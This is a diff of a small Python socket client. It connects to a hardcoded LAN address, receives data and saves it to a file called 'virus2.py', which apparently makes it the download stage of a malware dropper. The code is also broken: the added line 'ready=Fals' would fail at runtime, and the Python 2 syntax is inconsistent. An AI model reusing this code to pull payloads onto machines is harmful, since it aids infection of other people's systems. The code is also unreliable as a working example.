@@ -1,25 +1,27 @@
 import socket                   # Import socket module
 import os
+global ready
 s = socket.socket()             # Create a socket object
-host = socket.gethostname()     # Get local machine name
-port = 60020                  # Reserve a port for your service.
+host = "192.168.1.20"     # Get local machine name
+port = 60028                 # Reserve a port for your service.
 
 s.connect((host, port))
 s.send("Hello server!")
+ready=Fals
 
-
-while True: 
+while True:
+    ready=False
     print('receiving data...')
     data = s.recv(10000)
-    print('data=%s', (data))
     if not data:
            break
      # write data to a file
-    with open('C:\Users\Admin\Desktop\uusemee.py', 'w') as f:
-      print 'file opened'
+    with open('virus2.py', 'w') as f:
       f.write(data)
+      ready=True
+      
     s.send("Hello server!")
-
+    
 f.close()
 print('Successfully get the file')
 s.close()
